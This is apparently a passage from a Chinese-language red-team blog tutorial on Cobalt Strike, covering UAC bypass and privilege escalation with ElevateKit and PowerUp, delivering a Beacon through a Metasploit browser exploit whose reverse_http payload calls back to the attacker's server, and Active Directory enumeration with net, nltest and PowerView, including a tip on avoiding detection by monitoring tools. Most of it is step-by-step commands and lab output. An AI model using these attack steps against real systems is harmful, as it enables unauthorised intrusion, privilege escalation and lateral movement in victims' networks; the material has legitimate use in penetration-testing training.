<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>自 Windows vista 开始，Windows 系统引进了用户账户控制机制，即 UAC<code>User Account Control</code>机制，UAC 机制在 Win 7中得到了完善。UAC 与 UNIX 中的 sudo 工作机制十分相似，平时用户以普通权限工作，当用户需要执行特权操作时，系统会询问他们是否要提升权限。</p>
<p>此时系统用户可分为以下三种等级：</p>
<p>高：管理员权限</p>
<p>中：一般用户权限</p>
<p>低：受限制的权限</p>
<p>使用<code>whoami /groups</code>命令可以看到当前用户所在的组以及权限，使用<code>net localgroup administrators</code>可以查看当前在管理员组里的用户名。</p>
<p><strong>提权操作</strong></p>
<p>当某些操作需要管理员权限，而当前用户权限只有一般用户权限时，就需要提权操作了。</p>
<p>在 CS 中有以下几种提权操作：</p>
<p><code>bypassuac</code>：将本地中级管理员权限提升至本地高级管理员权限，适用于Win 7 及以上的系统。</p>
<p><code>elevate</code>：将任意用户的权限提升至系统权限，适用于2018年11月更新之前的 Win 7 和 Win 10 系统。</p>
<p><code>getsystem</code>：将本地高级管理员权限提升至系统权限。</p>
<p><code>runas</code>：使用其他用户的凭证来以其他用户身份运行一个命令，该命令不会返回任何输出。</p>
<p><code>spawnas</code>：使用其他用户的凭证来以其他用户身份派生一个会话，这个命令派生一个临时的进程并将 payload stage 注入进那个进程</p>
<p><strong>Spawn As</strong></p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230110121933496.png" alt="image-20230110121933496" style="zoom:50%;" />

<p>首先，右击待提权的会话，选择<code>Access --&gt; Spawn As</code>，输入目标系统用户身份信息，其中域信息填写一个“点”代表本地用户，监听器这里选择的 SMB 监听器，之后点击运行就能看到对应的用户上线了。</p>
<p><strong>Bypass UAC</strong> </p>
<p>Bypass UAC 有两个步骤，分别是：</p>
<p>1、利用 UAC 漏洞来获取一个特权文件副本</p>
<p>2、使用 DLL 劫持进行代码执行</p>
<p>首先使用<code>shell whoami /groups</code>查看当前上线主机用户的所属组及 UAC 等级</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230110122103644.png" alt="image-20230110122103644" style="zoom:67%;" />

<p>通过返回信息可以看出，当前用户为管理员权限，UAC 等级为中，此时可以使用<code>bypassuac</code>进行提权。</p>
<p>首先，右击会话，选择<code>Access --&gt; Elevate</code>，这里选择一个 SMB Beacon，Exploit 选择<code>uac-token-duplication</code>，最后 Launch 即可。</p>
<p>待 Beacon Check in 后，当前用户 UAC 为高权限的会话便会上线了</p>
<p><strong>例：</strong></p>
<p>由于CS自带的提权方式较少，因此这里就先加载一些网上的提权脚本，脚本下载地址：<a target="_blank" rel="noopener" href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a></p>
<p>下载之后，打开<code>Cobalt Strike --&gt; Script Manager</code> ，之后点击<code>Load</code>，选择自己刚才下载的文件中的<code>elevate.cna</code>文件</p>
<p>接着选择要提权的主机，右击选择<code>Access --&gt; Elevate</code>，Listener中选择刚才新建的SMB Beacon，这里的Exploit选择了ms14-058，如果使用ms14-058不能提权，就换一个Exploit进行尝试</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230110121145989.png" alt="image-20230110121145989"></p>
<p>顺利的情况下，就可以看到提权后的管理员权限会话了，在管理员权限的会话中，不光用户名后有个*号，其Logo也是和其他会话不同的</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230110120942138.png" alt="image-20230110120942138"  />





<p><strong>PowerUp</strong></p>
<p>PowerUp 所做的事是寻找可能存在弱点的地方，从而帮助提权。</p>
<p>利用 PowerUp 进行提权需要首先导入 ps1 文件<code>powershell-import PowerUp.ps1</code>，再执行<code>powershell Invoke-AllChecks</code>命令，使用 PowerUp 脚本可以快速的帮助我们发现系统弱点，从而实现提权的目的。</p>
<p>其中<code>PowerUp.ps1</code>文件可从这里下载：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc(opens new window)</a></p>
<p><strong>PowerUp 的使用</strong></p>
<p>执行以下命令：将 ps1 文件上传到目标主机，并执行所有弱点检查。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell-import PowerUp.ps1</span><br><span class="line">powershell invoke-allchecks</span><br></pre></td></tr></table></figure>

<p>详细运行过程：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell-import PowerUp.ps1</span><br><span class="line">[*] Tasked beacon to import: PowerUp.ps1</span><br><span class="line">[+] host called home, sent: 275084 bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell invoke-allchecks</span><br><span class="line">[*] Tasked beacon to run: invoke-allchecks</span><br><span class="line">[+] host called home, sent: 313 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[*] Running Invoke-AllChecks</span><br><span class="line">[+] Current user already has local administrative privileges!</span><br><span class="line">[*] Checking for unquoted service paths...</span><br><span class="line"></span><br><span class="line">[*] Checking service executable and argument permissions...</span><br><span class="line">[+] received output:</span><br><span class="line">ServiceName                     : AeLookupSvc</span><br><span class="line">Path                            : C:\Windows\system32\svchost.exe -k netsvcs</span><br><span class="line">ModifiableFile                  : C:\Windows\system32</span><br><span class="line">ModifiableFilePermissions       : GenericAll</span><br><span class="line">ModifiableFileIdentityReference : BUILTIN\Administrators</span><br><span class="line">StartName                       : localSystem</span><br><span class="line">AbuseFunction                   : Install-ServiceBinary -Name &#x27;AeLookupSvc&#x27;</span><br><span class="line">CanRestart                      : True</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"></span><br><span class="line">[*] Checking service permissions...</span><br><span class="line">[+] received output:</span><br><span class="line">ServiceName   : AeLookupSvc</span><br><span class="line">Path          : C:\Windows\system32\svchost.exe -k netsvcs</span><br><span class="line">StartName     : localSystem</span><br><span class="line">AbuseFunction : Invoke-ServiceAbuse -Name &#x27;AeLookupSvc&#x27;</span><br><span class="line">CanRestart    : True</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"></span><br><span class="line">[*] Checking %PATH% for potentially hijackable DLL locations...</span><br><span class="line">[+] received output:</span><br><span class="line">Permissions       : GenericAll</span><br><span class="line">ModifiablePath    : C:\Windows\system32\WindowsPowerShell\v1.0\</span><br><span class="line">IdentityReference : BUILTIN\Administrators</span><br><span class="line">%PATH%            : %SystemRoot%\system32\WindowsPowerShell\v1.0\</span><br><span class="line">AbuseFunction     : Write-HijackDll -DllPath &#x27;C:\Windows\system32\WindowsPowerS</span><br><span class="line">                    hell\v1.0\\wlbsctrl.dll&#x27;</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"></span><br><span class="line">[*] Checking for AlwaysInstallElevated registry key...</span><br><span class="line">[*] Checking for Autologon credentials in registry...</span><br><span class="line"></span><br><span class="line">[*] Checking for modifidable registry autoruns and configs...</span><br><span class="line">[+] received output:</span><br><span class="line">Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VMware Use</span><br><span class="line">                 r Process</span><br><span class="line">Path           : &quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot; -n vmusr</span><br><span class="line">ModifiableFile : @&#123;Permissions=System.Object[]; ModifiablePath=C:\Program Files</span><br><span class="line">                 \VMware\VMware Tools\vmtoolsd.exe; IdentityReference=BUILTIN\A</span><br><span class="line">                 dministrators&#125;</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"></span><br><span class="line">[*] Checking for modifiable schtask files/configs...</span><br><span class="line">[+] received output:</span><br><span class="line">TaskName     : GoogleUpdateTaskMachineCore</span><br><span class="line">TaskFilePath : @&#123;Permissions=System.Object[]; ModifiablePath=C:\Program Files (</span><br><span class="line">               x86)\Google\Update\GoogleUpdate.exe; IdentityReference=BUILTIN\A</span><br><span class="line">               dministrators&#125;</span><br><span class="line">TaskTrigger  : &lt;Triggers xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mi</span><br><span class="line">               t/task&quot;&gt;&lt;LogonTrigger&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;/LogonTrigger&gt;&lt;Cal</span><br><span class="line">               endarTrigger&gt;&lt;StartBoundary&gt;2020-04-11T21:47:44&lt;/StartBoundary&gt;&lt;</span><br><span class="line">               ScheduleByDay&gt;&lt;DaysInterval&gt;1&lt;/DaysInterval&gt;&lt;/ScheduleByDay&gt;&lt;/Ca</span><br><span class="line">               lendarTrigger&gt;&lt;/Triggers&gt;</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line">[*] Checking for unattended install files...</span><br><span class="line">UnattendPath : C:\Windows\Panther\Unattend.xml</span><br><span class="line"></span><br><span class="line">[*] Checking for encrypted web.config strings...</span><br><span class="line">[*] Checking for encrypted application pool and virtual directory passwords...</span><br><span class="line">[*] Checking for plaintext passwords in McAfee SiteList.xml files....</span><br><span class="line">[+] received output:</span><br><span class="line">[*] Checking for cached Group Policy Preferences .xml files....</span><br><span class="line">[+] received output:</span><br></pre></td></tr></table></figure>

<p>如果在自己的靶机上发现导入ps1文件失败，这可能是因为系统不允许执行不信任的脚本文件导致的。</p>
<p>以管理员权限打开 Powershell，运行<code>set-ExecutionPolicy RemoteSigned</code>，输入<code>Y</code>回车，此时系统便能导入<code>PowerUp.ps1</code>文件了</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\WINDOWS\system32&gt; set-ExecutionPolicy RemoteSigned</span><br><span class="line">执行策略更改</span><br><span class="line">执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170</span><br><span class="line">中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?</span><br><span class="line">[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): Y</span><br><span class="line">PS C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure>

<p>在运行<code>Invoke-AllChecks</code>后，便会列出当前系统中可被提权的弱点之处，之后再执行检查结果中<code>AbuseFunction</code>下的命令便能开始提权操作了。</p>
<p>但是我在自己本地环境中并未复现成功，执行<code>AbuseFunction</code>后的命令只能创建一个与当前登录用户相同权限的账户，没能达到提权的目的。</p>
<h5 id="MSF-与-CS-的结合利用"><a href="#MSF-与-CS-的结合利用" class="headerlink" title="MSF 与 CS 的结合利用"></a>MSF 与 CS 的结合利用</h5><p>如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。</p>
<p>1、首先在MSF上选择攻击模块</p>
<p>2、接着在MSF上设置Payload为<code>windows/meterpreter/reverse_http</code>或者<code>windows/meterpreter/reverse_https</code>，这么做是因为CS的Beacon与MSF的分阶段协议是相兼容的</p>
<p>3、之后在MSF中设置Payload的LHOST、LPORT为CS中Beacon的监听器IP及端口</p>
<p>4、然后设置 <code>DisablePayloadHandler</code> 为 True，此选项会让 MSF 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉MSF说我们已经建立了监听器，不必再新建监听器了</p>
<p>5、再设置 <code>PrependMigrate</code> 为 True，此选项让 MSF 前置 shellcode 在另一个进程中运行 payload stager。如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活</p>
<p>6、最后运行<code>exploit -j</code>，-j 是指作为job开始运行，即在后台运行</p>
<p><strong>操作</strong></p>
<p>在CS中新建一个HTTP Beacon，创建过程不再赘述。</p>
<p>1、在MSF中选择攻击模块，根据教程这里选择的<code>adobe_flash_hacking_team_uaf</code>模块，不过个人感觉现在这个模块已经不太能被利用成功了</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/browser/adobe_flash_hacking_team_uaf</span><br></pre></td></tr></table></figure>

<p>2、接着配置payload，这里选择revese_http payload</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/revese_http</span><br><span class="line">set LHOST cs_server_ip</span><br><span class="line">set LPORT 80</span><br></pre></td></tr></table></figure>

<p>3、之后，配置<code>DisablePayloadHandler</code>、<code>PrependMigrate</code>为 True</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set DisablePayloadHandler True</span><br><span class="line">set PrependMigrate True</span><br></pre></td></tr></table></figure>

<p>4、最后，开始攻击。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit -j</span><br></pre></td></tr></table></figure>





<h5 id="横向扩展"><a href="#横向扩展" class="headerlink" title="横向扩展"></a>横向扩展</h5><p><strong>1、Windows 企业局域网环境介绍</strong> </p>
<p><strong>活动目录</strong></p>
<p>活动目录<code>Active Directory</code>是一种能够集中管理用户、系统和策略的技术，活动目录的一个重要概念就是 <code>域</code>。</p>
<p>Active Directory 存储有关网络上对象的信息，并让管理员和用户可以更容易地使用这些信息。例如 Active Directory 域服务即 AD DS 存储着有关用户账户的信息，并且使同一网络下的其他授权用户可以访问此信息。</p>
<p><strong>域</strong></p>
<p>域<code>Domain</code>即是一个管理员或者说是网络边界，在域里的用户和系统都是通过 AD进行管理的。</p>
<p>在域里，如果想控制服务器进行操作就需要取得域的信任。</p>
<p><strong>域控制器</strong></p>
<p>域控制器<code>Domain Controller</code>顾名思义就是一个对域里的用户和系统进行身份验证的一个系统。</p>
<p><strong>本地用户</strong></p>
<p>本地用户<code>Local User</code>就是系统上的一个标准用户。</p>
<p>当我们想在 Windows 命令行下指定一个本地的用户时，可以通过输入 <code>.\本地用户名</code>或者 <code>计算机名\本地用户名</code>来指定本地的用户账户，其中<code>.</code>表示计算机名。</p>
<p><strong>域用户</strong></p>
<p>域用户<code>Domain User</code>是指域控制器下的用户，如果想指定域用户，可以输入<code>域名\域用户名</code></p>
<p><strong>本地管理员</strong></p>
<p>本地管理员<code>Local Administrator</code>即是指在本地系统有管理权限的用户。</p>
<p><strong>域管理员</strong></p>
<p>域管理员<code>Domain Administrator</code>是指在域控制器上有管理权限的用户。</p>
<blockquote>
<p>注意：在 Cobalt Strike 中运行只需要根据命令类型在命令前加上 shell 或者 powershell 即可</p>
</blockquote>
<p><strong>2、主机和用户枚举</strong></p>
<h6 id="主机枚举"><a href="#主机枚举" class="headerlink" title="主机枚举"></a><strong>主机枚举</strong></h6><p>一些问题</p>
<p>当进入目标局域网时，需要弄清楚几个问题。</p>
<p>1、我正处在那个域上？</p>
<p>2、域信任关系是什么样的？</p>
<p>3、可以登陆哪些域？这些域上有哪些系统？目标是什么？可以获取什么？</p>
<p>4、系统上存放共享数据的地方在哪里？</p>
<p><strong>一些枚举的命令</strong></p>
<ul>
<li><p><code>net view /domain</code></p>
<p>枚举出当前域</p>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; net view /domain</span><br><span class="line">Domain</span><br><span class="line"><span class="literal">-------------------------</span></span><br><span class="line">TEAMSSIX</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>net view /domain:[domain]</code>、<code>net group &quot;domain computers&quot; /domain</code></p>
<p><code>net view /domain:[domain]</code>枚举域上一个主机的列表，但不是所有主机，这个也就是在网上邻居中可以看到的内容。</p>
<p><code>net group &quot;domain computers&quot; /domain</code>可以获得加入到这个域中的电脑账户列表。</p>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; net view /domain:teamssix</span><br><span class="line">服务器名称            注解</span><br><span class="line"><span class="literal">----------------------------------</span></span><br><span class="line">\\WIN<span class="literal">-72A8ERDSF2P</span></span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span></span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain</span><br><span class="line">组名     Domain Computers</span><br><span class="line">注释     加入到域中的所有工作站和服务器</span><br><span class="line">成员</span><br><span class="line"><span class="literal">----------------------------------------------</span></span><br><span class="line">WIN<span class="literal">-72A8ERDSF2P</span><span class="variable">$</span></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>nltest /dclist:[domain]</code></p>
<p>如果想找到那个主机是域的域控服务器，可以使用<code>nltest</code>命令</p>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; nltest /dclist:teamssix</span><br><span class="line">获得域“teamssix”中 DC 的列表(从“\\WIN<span class="literal">-P2AASSD1AF1</span>”中)。</span><br><span class="line">    WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com [<span class="type">PDC</span>]  [<span class="type">DS</span>] 站点: Default<span class="literal">-First-Site-Name</span></span><br><span class="line">此命令成功完成</span><br></pre></td></tr></table></figure>

<p> 当使用 32 位的 payload 运行在 64 位的系统上，并且 nltest 路径不对的时候，可能会提示没有 nltest 这个命令，这时可以尝试使用下面的命令为其指定路径</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; C:\windows\sysnative\nltest /dclist:teamssix</span><br><span class="line">获得域“teamssix”中 DC 的列表(从“\\WIN<span class="literal">-P2AASSD1AF1</span>”中)。</span><br><span class="line">    WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com [<span class="type">PDC</span>]  [<span class="type">DS</span>] 站点: Default<span class="literal">-First-Site-Name</span></span><br><span class="line">此命令成功完成</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>nslookup [name]</code>、<code>ping -n 1 -4 [name]</code></p>
<p>有时在 Cobalt Strike 里，我们只需要使用目标的 NetBIOS 名称，而不用在意使用 IPv4 地址或者 IPv6 地址，NetBIOS 名称是在域上每台机器的完整名称</p>
<p>但是如果想通过一个 IPv4 地址转换为一个 NetBIOS 名称，可以使用 nslookup 命令，或者使用 ping 发送一个包来获得主机返回的 IP 地址</p>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; nslookup WIN<span class="literal">-P2AASSD1AF1</span></span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  ::<span class="number">1</span></span><br><span class="line">名称:    WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com</span><br><span class="line">Address:  <span class="number">192.168</span>.<span class="number">15.124</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; ping <span class="literal">-n</span> <span class="number">1</span> <span class="literal">-4</span> WIN<span class="literal">-P2AASSD1AF1</span></span><br><span class="line">正在 Ping WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com [<span class="number">192.168</span><span class="type">.15.124</span>] 具有 <span class="number">32</span> 字节的数据:</span><br><span class="line">来自 <span class="number">192.168</span>.<span class="number">15.124</span> 的回复: 字节=<span class="number">32</span> 时间&lt;<span class="number">1</span>ms TTL=<span class="number">128</span></span><br><span class="line"><span class="number">192.168</span>.<span class="number">15.124</span> 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = <span class="number">1</span>，已接收 = <span class="number">1</span>，丢失 = <span class="number">0</span> (<span class="number">0</span>% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = <span class="number">0</span>ms，最长 = <span class="number">0</span>ms，平均 = <span class="number">0</span>ms</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>nltest /domain_trusts</code>、<code>nltest /server:[address] /domain_trusts</code></p>
<p>如果想取得域上的信任关系，可以使用 nltest 命令来实现</p>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; nltest /domain_trusts</span><br><span class="line">域信任的列表:</span><br><span class="line">    <span class="number">0</span>: TEAMSSIX teamssix.com (NT <span class="number">5</span>) (Forest Tree Root) (Primary Domain) (Native)</span><br><span class="line">此命令成功完成</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; nltest /server:<span class="number">192.168</span>.<span class="number">15.124</span> /domain_trusts</span><br><span class="line">域信任的列表:</span><br><span class="line">    <span class="number">0</span>: TEAMSSIX teamssix.com (NT <span class="number">5</span>) (Forest Tree Root) (Primary Domain) (Native)</span><br><span class="line">此命令成功完成</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>net view \\[name]</code></p>
<p>如果想列出主机上的共享列表，只需输入<code>net view \\[name]</code>即可</p>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; net view \\WIN<span class="literal">-P2AASSD1AF1</span></span><br><span class="line">在 \\WIN<span class="literal">-75F8PRJM4TP</span> 的共享资源</span><br><span class="line">共享名  类型  使用为  注释</span><br><span class="line"><span class="literal">----------------------------------</span></span><br><span class="line">Users   Disk</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>



<p>PowerView</p>
<p>在渗透进入内网后，如果直接使用 Windows 的内置命令，比如 <code>net view、net user</code>等，可能就会被管理人员或者各种安全监控设备所发现。因此较为安全的办法就是使用 Powershell 和 VMI 来进行躲避态势感知的检测。</p>
<p>PowerView 是由 Will Schroeder 开发的 PowerShell 脚本，该脚本完全依赖于 Powershell 和 VMI ，使用 PowerView 可以更好的收集内网中的信息，在使用之前，与上一节 PowerUp 的一样需要先 import 导入 ps1 文件。</p>
<p>PowerView 下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p>
<p>一些 PowerView 的命令：</p>
<ul>
<li><p>Get-NetDomain</p>
<p>查询本地域的信息</p>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\PowerView&gt; <span class="built_in">Get-NetDomain</span></span><br><span class="line">Forest                  : teamssix.com</span><br><span class="line">DomainControllers       : &#123;WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com&#125;</span><br><span class="line">Children                : &#123;&#125;</span><br><span class="line">DomainMode              : Windows2012Domain</span><br><span class="line">Parent                  :</span><br><span class="line">PdcRoleOwner            : WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com</span><br><span class="line">RidRoleOwner            : WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com</span><br><span class="line">InfrastructureRoleOwner : WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com</span><br><span class="line">Name                    : teamssix.com</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Invoke-ShareFinder</p>
<p>查找网络上是否存在共享</p>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\PowerView&gt; <span class="built_in">Invoke-ShareFinder</span></span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com\ADMIN<span class="variable">$</span>   - 远程管理</span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com\C<span class="variable">$</span>       - 默认共享</span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com\IPC<span class="variable">$</span>     - 远程 IPC</span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com\NETLOGON         - Logon server share</span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com\SYSVOL   - Logon server share</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Invoke-MapDomainTrust</p>
<p>显示当前域的信任关系</p>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\PowerView&gt; <span class="built_in">Invoke-MapDomainTrust</span></span><br></pre></td></tr></table></figure>

<p>其他更多用法可以参考 PowerView 项目上的 ReadMe 部分</p>
<p><strong>Net 模块</strong></p>
<p>Cobalt Strike 中有自己的 net 模块，net 模块是 beacon 后渗透攻击模块，它通过 windows 的网络管理 api 函数来执行命令，想使用 net 命令，只需要在 beacon 的控制中心输入 net + 要执行的命令即可。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net dclist : 列出当前域的域控制器</span><br><span class="line">net dclist [<span class="type">DOMAIN</span>] : 列出指定域的域控制器</span><br><span class="line">net share \\[<span class="type">name</span>] : 列出目标的共享列表</span><br><span class="line">net view : 列出当前域的主机</span><br><span class="line">net view [<span class="type">DOMAIN</span>] : 列出指定域的主机</span><br></pre></td></tr></table></figure>

<p>在 beacon 控制台中输入这些命令很类似输入一个本地的 net 命令，但是有一些些许的不同，比如下面一个是在主机上运行 net view 的结果一个是在 beacon 控制台下运行 net view 的结果。不难看出，beacon 下输出的结果更为丰富。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; net view</span><br><span class="line">服务器名称            注解</span><br><span class="line"><span class="literal">-------------------------------------------</span></span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>

